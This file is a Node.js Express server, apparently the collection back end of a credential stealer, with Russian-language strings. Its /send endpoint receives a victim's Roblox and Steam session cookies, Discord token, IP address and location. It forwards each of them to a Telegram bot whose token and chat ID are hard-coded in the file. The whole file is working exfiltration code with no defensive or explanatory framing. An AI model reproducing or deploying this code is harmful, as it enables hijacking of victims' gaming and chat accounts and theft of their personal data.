const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TOKEN = "8679009953:AAE6I66uPMllDNCAdIL2vTUD7fs_Hvoo7uc";
const CHAT_ID = "6145369088";
const API = "https://api.telegram.org/bot" + TOKEN;

app.post('/send', async (req, res) => {
    try {
        const { robloxCookie, steamCookie, discordToken, ip, country, city } = req.body;

        let msg = "👋 ЗАПУЩЕН\n\n";
        if (ip) {
            msg += "IP: " + ip + "\n";
            msg += "Страна: " + (country || "Н/Д") + "\n";
            msg += "Город: " + (city || "Н/Д");
        }

        await axios.post(API + "/sendMessage", {
            chat_id: CHAT_ID,
            text: msg
        });

        // Отправка файлов через sendDocument с правильным Content-Type
        if (robloxCookie) {
            try {
                await axios.post(
                    API + "/sendDocument",
                    {
                        chat_id: CHAT_ID,
                        document: robloxCookie,
                        caption: "Roblox Cookie"
                    },
                    {
                        headers: { "Content-Type": "application/json" }
                    }
                );
            } catch (e) {
                console.log("Ошибка Roblox файла:", e.message);
            }
        }

        if (steamCookie) {
            try {
                await axios.post(
                    API + "/sendDocument",
                    {
                        chat_id: CHAT_ID,
                        document: steamCookie,
                        caption: "Steam Cookie"
                    },
                    {
                        headers: { "Content-Type": "application/json" }
                    }
                );
            } catch (e) {
                console.log("Ошибка Steam файла:", e.message);
            }
        }

        if (discordToken) {
            try {
                await axios.post(
                    API + "/sendDocument",
                    {
                        chat_id: CHAT_ID,
                        document: discordToken,
                        caption: "Discord Token"
                    },
                    {
                        headers: { "Content-Type": "application/json" }
                    }
                );
            } catch (e) {
                console.log("Ошибка Discord файла:", e.message);
            }
        }

        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.listen(process.env.PORT || 3000);
